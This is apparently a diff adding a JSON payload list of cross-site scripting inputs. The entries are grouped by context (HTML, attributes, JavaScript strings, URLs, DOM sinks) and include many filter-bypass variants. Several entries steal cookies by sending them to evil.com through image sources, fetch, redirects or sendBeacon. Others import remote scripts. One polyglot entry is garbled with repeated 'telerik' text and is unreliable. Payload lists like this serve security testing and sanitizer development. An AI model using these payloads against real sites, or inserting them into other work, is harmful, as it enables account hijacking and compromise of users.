@@ -1,0 +1,596 @@
+[
+  {
+    "value": "<script>alert(1)</script>",
+    "technique": "basic-script",
+    "context": "html",
+    "description": "Classic script tag injection"
+  },
+  {
+    "value": "<script>alert(String.fromCharCode(88,83,83))</script>",
+    "technique": "charcode-script",
+    "context": "html",
+    "description": "Script tag with String.fromCharCode to avoid keyword filters"
+  },
+  {
+    "value": "<script src=//evil.com/xss.js></script>",
+    "technique": "external-script",
+    "context": "html",
+    "description": "External script inclusion via protocol-relative URL"
+  },
+  {
+    "value": "<script>eval(atob('YWxlcnQoMSk='))</script>",
+    "technique": "base64-eval",
+    "context": "html",
+    "description": "Base64-encoded payload executed via atob and eval"
+  },
+  {
+    "value": "<img src=x onerror=alert(1)>",
+    "technique": "img-onerror",
+    "context": "html",
+    "description": "Image tag with onerror handler triggered by invalid src"
+  },
+  {
+    "value": "<img/src=x onerror=alert(1)//>",
+    "technique": "img-onerror-slash",
+    "context": "html",
+    "description": "Image tag with slash separator to bypass naive tag parsing"
+  },
+  {
+    "value": "<svg onload=alert(1)>",
+    "technique": "svg-onload",
+    "context": "html",
+    "description": "SVG element with onload event handler"
+  },
+  {
+    "value": "<svg><animate onbegin=alert(1) attributeName=x dur=1s>",
+    "technique": "svg-animate",
+    "context": "html",
+    "description": "SVG animate element with onbegin event handler"
+  },
+  {
+    "value": "<svg><set onbegin=alert(1) attributeName=x to=1>",
+    "technique": "svg-set",
+    "context": "html",
+    "description": "SVG set element with onbegin event handler"
+  },
+  {
+    "value": "<details open ontoggle=alert(1)>",
+    "technique": "details-ontoggle",
+    "context": "html",
+    "description": "Details element with ontoggle fires on open attribute"
+  },
+  {
+    "value": "<body onload=alert(1)>",
+    "technique": "body-onload",
+    "context": "html",
+    "description": "Body tag with onload event handler"
+  },
+  {
+    "value": "<iframe srcdoc='<script>alert(1)</script>'>",
+    "technique": "iframe-srcdoc",
+    "context": "html",
+    "description": "Iframe srcdoc attribute containing script injection"
+  },
+  {
+    "value": "<iframe src=javascript:alert(1)>",
+    "technique": "iframe-js-src",
+    "context": "html",
+    "description": "Iframe with javascript: protocol in src"
+  },
+  {
+    "value": "<input onfocus=alert(1) autofocus>",
+    "technique": "input-autofocus",
+    "context": "html",
+    "description": "Input element with autofocus triggering onfocus handler"
+  },
+  {
+    "value": "<marquee onstart=alert(1)>",
+    "technique": "marquee-onstart",
+    "context": "html",
+    "description": "Marquee element with onstart event handler"
+  },
+  {
+    "value": "<video><source onerror=alert(1)>",
+    "technique": "video-source-onerror",
+    "context": "html",
+    "description": "Video source element with onerror handler"
+  },
+  {
+    "value": "<audio src=x onerror=alert(1)>",
+    "technique": "audio-onerror",
+    "context": "html",
+    "description": "Audio element with invalid src triggering onerror"
+  },
+  {
+    "value": "<object data=javascript:alert(1)>",
+    "technique": "object-js-data",
+    "context": "html",
+    "description": "Object element with javascript: protocol in data attribute"
+  },
+  {
+    "value": "<math><mtext><table><mglyph><svg><mtext><textarea><path id=x xmlns=http://www.w3.org/2000/svg d='M0 0'><animate attributeName=d values='M0 0' begin=0 onbegin=alert(1)>",
+    "technique": "math-svg-nesting",
+    "context": "html",
+    "description": "Deeply nested math/SVG elements to bypass sanitizers"
+  },
+  {
+    "value": "<xss onpointerrawupdate=alert(1) style=position:fixed;top:0;left:0;width:100%;height:100%>",
+    "technique": "custom-element-pointer",
+    "context": "html",
+    "description": "Custom element with pointer event handler covering viewport"
+  },
+  {
+    "value": "\" onfocus=alert(1) autofocus=\"",
+    "technique": "dblquote-onfocus",
+    "context": "attribute",
+    "description": "Break out of double-quoted attribute with onfocus autofocus"
+  },
+  {
+    "value": "' onfocus=alert(1) autofocus='",
+    "technique": "singlequote-onfocus",
+    "context": "attribute",
+    "description": "Break out of single-quoted attribute with onfocus autofocus"
+  },
+  {
+    "value": "\" onmouseover=alert(1) x=\"",
+    "technique": "dblquote-onmouseover",
+    "context": "attribute",
+    "description": "Break out of double-quoted attribute with onmouseover handler"
+  },
+  {
+    "value": "' onmouseover=alert(1) x='",
+    "technique": "singlequote-onmouseover",
+    "context": "attribute",
+    "description": "Break out of single-quoted attribute with onmouseover"
+  },
+  {
+    "value": "\" accesskey=x onclick=alert(1) x=\"",
+    "technique": "accesskey-onclick",
+    "context": "attribute",
+    "description": "Inject accesskey and onclick handler via attribute breakout"
+  },
+  {
+    "value": "\" oncontextmenu=alert(1) x=\"",
+    "technique": "contextmenu",
+    "context": "attribute",
+    "description": "Inject oncontextmenu handler via attribute breakout"
+  },
+  {
+    "value": "javascript:alert(1)//",
+    "technique": "href-js-protocol",
+    "context": "attribute",
+    "description": "Inject javascript: protocol into href or similar attribute"
+  },
+  {
+    "value": "\" style=animation-name:x onanimationstart=alert(1) x=\"",
+    "technique": "animation-event",
+    "context": "attribute",
+    "description": "CSS animation triggering onanimationstart handler"
+  },
+  {
+    "value": "\" tabindex=1 onfocus=alert(1) x=\"",
+    "technique": "tabindex-onfocus",
+    "context": "attribute",
+    "description": "Inject tabindex to make element focusable with onfocus"
+  },
+  {
+    "value": "\" onfocusin=alert(1) contenteditable x=\"",
+    "technique": "focusin-contenteditable",
+    "context": "attribute",
+    "description": "Inject onfocusin with contenteditable for focus trigger"
+  },
+  {
+    "value": "\" onbeforeinput=alert(1) contenteditable x=\"",
+    "technique": "beforeinput",
+    "context": "attribute",
+    "description": "Inject onbeforeinput with contenteditable attribute"
+  },
+  {
+    "value": "\"><img src=x onerror=alert(1)>",
+    "technique": "tag-breakout-img",
+    "context": "attribute",
+    "description": "Break out of tag entirely and inject img onerror"
+  },
+  {
+    "value": "'><svg onload=alert(1)>",
+    "technique": "tag-breakout-svg",
+    "context": "attribute",
+    "description": "Break out of single-quoted attribute and inject SVG"
+  },
+  {
+    "value": "\" onerror=alert(1) src=x y=\"",
+    "technique": "onerror-injection",
+    "context": "attribute",
+    "description": "Inject onerror directly when inside an img-like tag"
+  },
+  {
+    "value": "'-alert(1)-'",
+    "technique": "string-break-subtract",
+    "context": "javascript",
+    "description": "Break out of JS string using subtraction operator"
+  },
+  {
+    "value": "\\'-alert(1)//",
+    "technique": "escaped-quote-break",
+    "context": "javascript",
+    "description": "Bypass escaped quote by injecting backslash to neutralize escape"
+  },
+  {
+    "value": "\";alert(1)//",
+    "technique": "semicolon-break",
+    "context": "javascript",
+    "description": "Terminate JS statement and inject alert"
+  },
+  {
+    "value": "';alert(1)//",
+    "technique": "singlequote-semicolon",
+    "context": "javascript",
+    "description": "Break single-quoted string and inject statement"
+  },
+  {
+    "value": "${alert(1)}",
+    "technique": "template-literal",
+    "context": "javascript",
+    "description": "Inject into ES6 template literal via expression interpolation"
+  },
+  {
+    "value": "`-alert(1)-`",
+    "technique": "backtick-break",
+    "context": "javascript",
+    "description": "Break out of template literal using backtick"
+  },
+  {
+    "value": "\\x3cscript\\x3ealert(1)\\x3c/script\\x3e",
+    "technique": "hex-escape",
+    "context": "javascript",
+    "description": "Hex-encoded angle brackets for JS string context"
+  },
+  {
+    "value": "\\u003cscript\\u003ealert(1)\\u003c/script\\u003e",
+    "technique": "unicode-escape",
+    "context": "javascript",
+    "description": "Unicode-encoded angle brackets for JS string context"
+  },
+  {
+    "value": "'}alert(1)//",
+    "technique": "object-break",
+    "context": "javascript",
+    "description": "Break out of JS object literal and inject statement"
+  },
+  {
+    "value": "];alert(1)//",
+    "technique": "array-break",
+    "context": "javascript",
+    "description": "Break out of JS array literal and inject statement"
+  },
+  {
+    "value": "1;alert(1)",
+    "technique": "numeric-chain",
+    "context": "javascript",
+    "description": "Chain statement after numeric value assignment"
+  },
+  {
+    "value": "alert(1)//\\",
+    "technique": "trailing-backslash",
+    "context": "javascript",
+    "description": "Inject with trailing backslash to escape closing delimiter"
+  },
+  {
+    "value": "/alert(1)//\\",
+    "technique": "regex-break",
+    "context": "javascript",
+    "description": "Break out of regex literal context"
+  },
+  {
+    "value": "javascript:alert(1)",
+    "technique": "js-protocol",
+    "context": "url",
+    "description": "Basic javascript: protocol URI"
+  },
+  {
+    "value": "javascript:void(0);alert(1)",
+    "technique": "js-void-chain",
+    "context": "url",
+    "description": "Chain alert after javascript:void to bypass simple checks"
+  },
+  {
+    "value": "jaVaScRiPt:alert(1)",
+    "technique": "js-protocol-mixcase",
+    "context": "url",
+    "description": "Mixed case javascript: protocol to bypass case-sensitive filters"
+  },
+  {
+    "value": "data:text/html,<script>alert(1)</script>",
+    "technique": "data-uri-text",
+    "context": "url",
+    "description": "Data URI with text/html containing script"
+  },
+  {
+    "value": "data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==",
+    "technique": "data-uri-base64",
+    "context": "url",
+    "description": "Base64-encoded data URI with script payload"
+  },
+  {
+    "value": "javascript:alert(document.domain)",
+    "technique": "js-protocol-domain",
+    "context": "url",
+    "description": "javascript: protocol leaking document.domain"
+  },
+  {
+    "value": "\\x6aavascript:alert(1)",
+    "technique": "hex-j-protocol",
+    "context": "url",
+    "description": "Hex-encoded first character of javascript: protocol"
+  },
+  {
+    "value": "javascript&#58;alert(1)",
+    "technique": "html-entity-colon",
+    "context": "url",
+    "description": "HTML entity-encoded colon in javascript: protocol"
+  },
+  {
+    "value": "&#106;avascript:alert(1)",
+    "technique": "html-entity-j",
+    "context": "url",
+    "description": "HTML entity-encoded j in javascript: protocol"
+  },
+  {
+    "value": "data:text/html;charset=utf-8,<script>alert(1)</script>",
+    "technique": "data-uri-charset",
+    "context": "url",
+    "description": "Data URI with explicit charset declaration"
+  },
+  {
+    "value": "<img src=x onerror=document.write('<script>alert(1)<\\/script>')>",
+    "technique": "document-write-img",
+    "context": "dom",
+    "description": "Inject via document.write through img onerror"
+  },
+  {
+    "value": "<div id=x tabindex=1 onfocus=alert(1)></div>",
+    "technique": "dom-id-focus",
+    "context": "dom",
+    "description": "Inject focusable element exploitable via fragment identifier"
+  },
+  {
+    "value": "#<img src=x onerror=alert(1)>",
+    "technique": "fragment-injection",
+    "context": "dom",
+    "description": "Fragment identifier used in innerHTML sink"
+  },
+  {
+    "value": "'-alert(document.cookie)-'",
+    "technique": "cookie-exfil-string",
+    "context": "dom",
+    "description": "String break payload targeting cookie exfiltration"
+  },
+  {
+    "value": "<img src=x onerror=eval(location.hash.slice(1))>",
+    "technique": "hash-eval",
+    "context": "dom",
+    "description": "Eval payload from URL hash via location.hash"
+  },
+  {
+    "value": "<img src=x onerror=this.src='//evil.com/?c='+document.cookie>",
+    "technique": "cookie-exfil-img",
+    "context": "dom",
+    "description": "Exfiltrate cookies by setting image src to attacker domain"
+  },
+  {
+    "value": "javascript:fetch('//evil.com/?c='+document.cookie)",
+    "technique": "fetch-exfil",
+    "context": "dom",
+    "description": "Use fetch API for cookie exfiltration via DOM sink"
+  },
+  {
+    "value": "<svg onload=window.location='//evil.com/?c='+document.cookie>",
+    "technique": "redirect-exfil",
+    "context": "dom",
+    "description": "Redirect to attacker domain with cookies in URL"
+  },
+  {
+    "value": "\"><script>document.location='//evil.com/?c='+document.cookie</script>",
+    "technique": "breakout-redirect",
+    "context": "dom",
+    "description": "Break out of attribute and redirect with cookies"
+  },
+  {
+    "value": "<img src=x onerror=import('//evil.com/xss.js')>",
+    "technique": "dynamic-import",
+    "context": "dom",
+    "description": "Dynamic import of external module via onerror"
+  },
+  {
+    "value": "<img src=x onerror=navigator.sendBeacon('//evil.com',document.cookie)>",
+    "technique": "sendbeacon-exfil",
+    "context": "dom",
+    "description": "Use sendBeacon API for stealthy data exfiltration"
+  },
+  {
+    "value": "x]|alert(1)//",
+    "technique": "angular-sandbox-escape",
+    "context": "dom",
+    "description": "AngularJS sandbox escape in template expression"
+  },
+  {
+    "value": "{{constructor.constructor('alert(1)')()}}",
+    "technique": "template-engine-proto",
+    "context": "dom",
+    "description": "Template engine prototype chain to execute code"
+  },
+  {
+    "value": "<img src=x onerror=window['al'+'ert'](1)>",
+    "technique": "bracket-concat",
+    "context": "dom",
+    "description": "Bracket notation with string concatenation to call alert"
+  },
+  {
+    "value": "<img src=x onerror=self[atob('YWxlcnQ=')](1)>",
+    "technique": "atob-bracket",
+    "context": "dom",
+    "description": "Base64 decode function name via atob in bracket notation"
+  },
+  {
+    "value": "<scr<script>ipt>alert(1)</scr</script>ipt>",
+    "technique": "recursive-strip",
+    "context": "waf-bypass",
+    "description": "Nested script tags to survive single-pass tag stripping"
+  },
+  {
+    "value": "<ScRiPt>alert(1)</ScRiPt>",
+    "technique": "case-alternation",
+    "context": "waf-bypass",
+    "description": "Mixed case script tag to bypass case-sensitive filters"
+  },
+  {
+    "value": "<IMG SRC=x ONERROR=alert(1)>",
+    "technique": "uppercase-tag",
+    "context": "waf-bypass",
+    "description": "Uppercase HTML tag and attributes"
+  },
+  {
+    "value": "<img src=x onerror=alert`1`>",
+    "technique": "tagged-template",
+    "context": "waf-bypass",
+    "description": "Tagged template literal to call alert without parentheses"
+  },
+  {
+    "value": "<img src=x onerror=alert&lpar;1&rpar;>",
+    "technique": "html-entity-parens",
+    "context": "waf-bypass",
+    "description": "HTML entity encoded parentheses in event handler"
+  },
+  {
+    "value": "<svg/onload=alert(1)>",
+    "technique": "slash-separator",
+    "context": "waf-bypass",
+    "description": "Forward slash instead of space between tag and attribute"
+  },
+  {
+    "value": "<svg\tonload=alert(1)>",
+    "technique": "tab-separator",
+    "context": "waf-bypass",
+    "description": "Tab character as separator between tag and attribute"
+  },
+  {
+    "value": "<svg\nonload=alert(1)>",
+    "technique": "newline-separator",
+    "context": "waf-bypass",
+    "description": "Newline character as separator between tag and attribute"
+  },
+  {
+    "value": "<svg onload=top['al'+'ert'](1)>",
+    "technique": "string-concat-call",
+    "context": "waf-bypass",
+    "description": "String concatenation in bracket notation to bypass alert filter"
+  },
+  {
+    "value": "<svg onload=&#97;&#108;&#101;&#114;&#116;(1)>",
+    "technique": "decimal-entity",
+    "context": "waf-bypass",
+    "description": "HTML decimal entities to encode function name in event handler"
+  },
+  {
+    "value": "<svg onload=&#x61;&#x6c;&#x65;&#x72;&#x74;(1)>",
+    "technique": "hex-entity",
+    "context": "waf-bypass",
+    "description": "HTML hex entities to encode function name in event handler"
+  },
+  {
+    "value": "<!--><svg onload=alert(1)>-->",
+    "technique": "comment-breakout",
+    "context": "waf-bypass",
+    "description": "HTML comment edge case to bypass comment-aware filters"
+  },
+  {
+    "value": "<a href=\"javascript:void(0)\" onclick=alert(1)>click</a>",
+    "technique": "anchor-onclick",
+    "context": "waf-bypass",
+    "description": "Anchor tag with onclick handler and javascript void href"
+  },
+  {
+    "value": "<img src=x onerror=window.onerror=alert;throw+1>",
+    "technique": "throw-onerror",
+    "context": "waf-bypass",
+    "description": "Set window.onerror to alert and throw to trigger it"
+  },
+  {
+    "value": "<img src=x onerror=alert(1)//",
+    "technique": "unclosed-tag",
+    "context": "waf-bypass",
+    "description": "Unclosed img tag with comment to absorb trailing content"
+  },
+  {
+    "value": "<x onclick=alert(1)>click this</x>",
+    "technique": "custom-tag",
+    "context": "waf-bypass",
+    "description": "Custom/unknown HTML element with onclick handler"
+  },
+  {
+    "value": "<img src=\"x`onerror=alert(1)\" `>",
+    "technique": "backtick-attr",
+    "context": "waf-bypass",
+    "description": "Backtick character to confuse attribute parsing in older browsers"
+  },
+  {
+    "value": "%3Csvg%20onload=alert(1)%3E",
+    "technique": "url-encoded",
+    "context": "waf-bypass",
+    "description": "URL-encoded SVG onload payload for double-decode scenarios"
+  },
+  {
+    "value": "%253Csvg%2520onload=alert(1)%253E",
+    "technique": "double-url-encoded",
+    "context": "waf-bypass",
+    "description": "Double URL-encoded payload for double-decode vulnerabilities"
+  },
+  {
+    "value": "<style>@keyframes x{}</style><div style=animation-name:x onanimationstart=alert(1)>",
+    "technique": "css-animation-trigger",
+    "context": "waf-bypass",
+    "description": "CSS animation keyframe triggering JS event handler"
+  },
+  {
+    "value": "<svg><script>alert&#40;1&#41;</script></svg>",
+    "technique": "svg-script-entity",
+    "context": "waf-bypass",
+    "description": "SVG wrapping script with HTML entities for parentheses"
+  },
+  {
+    "value": "javas\tcript:alert(1)",
+    "technique": "tab-in-protocol",
+    "context": "waf-bypass",
+    "description": "Tab character inserted in javascript: protocol"
+  },
+  {
+    "value": "java\rscript:alert(1)",
+    "technique": "cr-in-protocol",
+    "context": "waf-bypass",
+    "description": "Carriage return inserted in javascript: protocol"
+  },
+  {
+    "value": "<img src=x onerror=Function('alert(1)')()>",
+    "technique": "function-constructor",
+    "context": "waf-bypass",
+    "description": "Function constructor to execute code without direct alert call"
+  },
+  {
+    "value": "<img src=x onerror=setTimeout('alert(1)')>",
+    "technique": "settimeout-string",
+    "context": "waf-bypass",
+    "description": "setTimeout with string argument to execute code"
+  },
+  {
+    "value": "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcLiCk=alert() )//%%0telerik%%0telerik11telerik/telerik//telerik%0telerik%0telerik%0telerik%0Atelerik%0telerik%0Atelerik%0telerik%0telerik%0Atelerik%0Atelerik%0Atelerik'\"\\>%0telerik<svg/onload=alert()//>",
+    "technique": "polyglot-mega",
+    "context": "waf-bypass",
+    "description": "Multi-context polyglot payload covering many injection points"
+  },
+  {
+    "value": "'-alert(1)-'</script><script>alert(1)//",
+    "technique": "polyglot-dual",
+    "context": "waf-bypass",
+    "description": "Polyglot for both JS string and script tag breakout contexts"
+  }
+]
